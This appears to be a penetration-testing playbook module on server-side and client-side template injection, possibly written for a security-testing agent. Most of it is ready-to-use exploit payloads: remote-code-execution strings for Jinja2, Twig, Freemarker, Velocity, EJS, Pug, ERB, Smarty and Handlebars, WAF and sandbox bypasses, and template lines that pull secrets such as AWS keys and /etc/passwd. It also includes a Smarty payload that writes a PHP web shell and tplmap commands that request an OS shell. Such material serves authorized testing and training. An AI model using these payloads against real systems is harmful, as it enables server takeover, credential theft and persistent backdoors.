# VULN MODULE — Server-Side Template Injection (SSTI) & Client-Side Template Injection (CSTI)
# Asset: webapp
# CWE-94 | Report prefix: WEB-SSTI / WEB-CSTI

## THREAT MODEL

SSTI: user input is embedded into a server-side template and evaluated by the
template engine → arbitrary code execution on the server.

CSTI: user input is embedded into a client-side template (AngularJS, Vue) →
JavaScript execution in the victim's browser (XSS-class, but via template).

SSTI is Critical (server RCE). CSTI is High (client XSS).

## DETECTION — INITIAL ERROR TRIGGER

First, break the template syntax to confirm server-side evaluation:
```
{   }   $   #   @   %)   "   '   |   {{   }}   ${   <%   <%=   %>
```
Any error, stack trace, or changed response → potential injection point. Then fingerprint.

## DETECTION — UNIVERSAL PROBE

```
{{7*7}}       → 49   (Jinja2, Twig, Pebble, Freemarker)
${7*7}        → 49   (Freemarker, Spring EL, Struts)
#{7*7}        → 49   (Thymeleaf, Ruby ERB)
<%= 7*7 %>    → 49   (ERB, EJS, ASP)
*{7*7}        → 49   (Thymeleaf)
{{7*'7'}}     → 7777777 (Jinja2) vs 49 (Twig) — engine fingerprint
${{7*7}}      → 49   (Mako, Velocity)
```

If math evaluates → SSTI confirmed. Identify the engine, then escalate to RCE.

## ENGINE FINGERPRINTING

```
Probe           Jinja2  Twig   Freemarker  Pebble  Mako   Smarty
{{7*7}}         49      49     NOOP        49      49      49
{{7*'7'}}       7777777 49     ERROR       7777777 ERROR   49
${7*7}          NOOP    NOOP   49          NOOP    NOOP    NOOP
```

## WHITEBOX PATTERNS

```bash
# Python — Jinja2 / Mako / Chameleon
grep -rn "render_template_string\|Environment.*from_string\|Template(" --include="*.py"
grep -rn "\.render(\|jinja2\.Template\|mako\.template" --include="*.py"

# PHP — Twig / Smarty / Blade
grep -rn "Twig_Environment\|twig_render\|\$twig->render\|\$smarty->display" --include="*.php"
grep -rn "view()->make\|Blade::render" --include="*.php"

# Java — Freemarker / Velocity / Thymeleaf / Pebble
grep -rn "Template\.process\|freemarker\|VelocityEngine\|templateEngine\.process" --include="*.java"
grep -rn "ThymeleafTemplateEngine\|PebbleEngine" --include="*.java"

# Node.js — EJS / Pug / Handlebars / Nunjucks
grep -rn "ejs\.render\|pug\.render\|handlebars\.compile\|nunjucks\.renderString" --include="*.js"

# Ruby — ERB
grep -rn "ERB\.new\|erb\.result\|render.*inline" --include="*.rb"

# Look for user input flowing into render functions
grep -rn "params\[\|request\.\(GET\|POST\)\|user_input" --include="*.py" --include="*.rb" -A3 | \
  grep -i "render\|template\|Template"
```

## RCE PAYLOADS BY ENGINE

### Jinja2 (Python)
```python
# Config object access → RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Class traversal
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}

# Shorter (find Popen index dynamically):
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'Popen' %}{{ c(['id'],stdout=-1).communicate() }}{% endif %}
{% endfor %}

# WAF bypass (filter evasion):
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
```

### Twig (PHP)
```php
// RCE via filter (unsandboxed)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Twig 1.x
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}

// PHP code execution
{{ "/etc/passwd"|file_excerpt(0,20) }}

// Sandbox bypass (when direct function calls are blocked):
// Uses block(), split(), map(), and join() — no direct function call needed
{%block X%}whoamiINTIGRITIsystem{%endblock%}{%set y=block('X')|split('INTIGRITI')%}{{[y|first]|map(y|last)|join}}
// Deconstruction:
//   block('X')           → "whoamiINTIGRITIsystem"
//   split('INTIGRITI')   → ["whoami", "system"]
//   y|first = "whoami" (command), y|last = "system" (PHP function)
//   map() calls system("whoami") → RCE without explicit function call
```

### Twig — variable enumeration and secret/object extraction
```
// Enumerate all template variables (keys) — reveals registered objects:
{{_context|keys|join(',')}}

// Once object names are known, access their properties directly:
{{secrets.MYSQL_PASSWD}}
{{secrets.AWS_SECRET_KEY}}

// Leverage insecure custom object functions for LFI (path traversal):
{{files.get_style_sheet('../../../../../etc/passwd')}}
// Replace get_style_sheet with whatever function the object exposes
// Enumerate functions by probing: {{object.methodName('test')}}
```

### Freemarker (Java)
```
// RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

### Velocity (Java)
```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
```

### EJS (Node.js)
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

### Pug (Node.js)
```javascript
#{root.process.mainModule.require('child_process').execSync('id')}
```

### ERB (Ruby)
```ruby
# If injecting inside an existing template context, escape first:
%><%=`whoami`    # closes current tag, opens eval tag, executes command
%><%=7*7         # confirm injection with math first

# Direct RCE:
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').readlines() %>
```

### Smarty (PHP)
```php
{php}system("id");{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## CSTI — CLIENT-SIDE TEMPLATE INJECTION

### AngularJS (ng-app scope)
```javascript
// Classic AngularJS sandbox escape (varies by version)
// v1.0.x – 1.1.x: no sandbox
{{constructor.constructor('alert(1)')()}}

// v1.2.x:
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// v1.5.x (most common):
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// Check version via ng-version attribute or source:
grep -r "angular" ./src --include="*.html" | grep version
```

### Vue.js
```javascript
// Vue does not have template injection by default
// Vulnerable only if user input is passed to v-html without sanitization
// or if template strings are dynamically compiled from user input:
// Vue.compile(userInput) → RCE-equivalent in browser
```

### Handlebars (client-side)
```javascript
// If template compiled from user input:
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## TOOLS

```bash
# tplmap — automated SSTI detection and exploitation
git clone https://github.com/epinna/tplmap
python3 tplmap.py -u 'https://target.com/page?name=*'
python3 tplmap.py -u 'https://target.com/page?name=*' --os-shell

# SSTImap (updated fork)
pip install sstimap
sstimap -u 'https://target.com/search?q=*'
```
